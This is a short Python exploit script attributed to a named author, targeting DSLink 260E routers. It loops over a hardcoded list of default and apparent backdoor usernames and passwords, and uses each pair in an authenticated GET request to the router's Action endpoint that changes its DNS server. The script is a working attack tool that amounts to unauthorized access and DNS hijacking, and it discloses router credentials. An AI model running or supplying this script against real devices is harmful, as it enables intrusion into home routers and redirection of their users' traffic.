#!/usr/bin/python
# -*- coding: utf-8 -*-
#Author: Jhonathan Davi jhoon | insightsecs at gmail.com | Twitter @jh00nbr
#Inurl Brasil: blog.inurl.com.br | fb.com/InurlBrasil

#DSLink 260E - Defaut Passwords DNS Change
#Changing DNS through GET method with default password.

import requests
import os
import sys
import base64

class bcolors:
    OKGREEN = '\033[92m'
    ERRO = '\033[91m'
    ENDC = '\033[0m'
    UNDERLINE = '\033[4m'

if len(sys.argv) != 2:
        print('How to use: xpl.py <ip>')
        sys.exit(1)
else:
        os.system('clear')
        print (" [ DSLink 260E - Defauts Passwords DNS Change ]")
        print (" [ Changing DNS through GET method with defaults passwords ]")
        print (" [ Author: Jhonathan Davi | insightsecs at gmail.com | Twitter @jh00nbr ]")

for user in ["admin", "root", "Administrator", "ctbc", "", "user", "support", "a27Bxz", "TMAR#DLKT20060313", "TMAR#DLKT20060307", "TMAR#DLKT20090202", "TMAR#DLKT20050227", "TMAR#DLKT20050516", "TMAR#DLKT20050227", "TMAR#DLKT20050519", "TMAR#DLKT20050516", "TMAR#DLKT20060627", "TMAR#DLKT20060205", "TMARDLKT93319"]:
   for passwd in ["", "root","teste","admin", "user", "1234", "1212", "supportuser", "s85Tcf", "normaluser", "parks", "Administrator", "administrator"]:
       try:
           ip = sys.argv[1]
           get = requests.get("http://"+ ip + "/Action?dns_status=1&dns_poll_timeout=2&id=57&dns_server_ip_1=8&dns_server_ip_2=8&dns_server_ip_3=8&dns_server_ip_4=8&priority=1&cmdAdd=Add", auth=(user, passwd))

           if get.status_code == 200:
               print bcolors.OKGREEN + "\n[+]" + bcolors.ENDC + " DNS changed success in: " + ip + "\n"
               sys.exit(1)
       except requests.ConnectionError:
           print "Failed connection"
           sys.exit(1)

if get.status_code == 404:
    print bcolors.ERRO + "\n[*]" + bcolors.ENDC + " /* Failed This router is not DSLink 260E */\n"
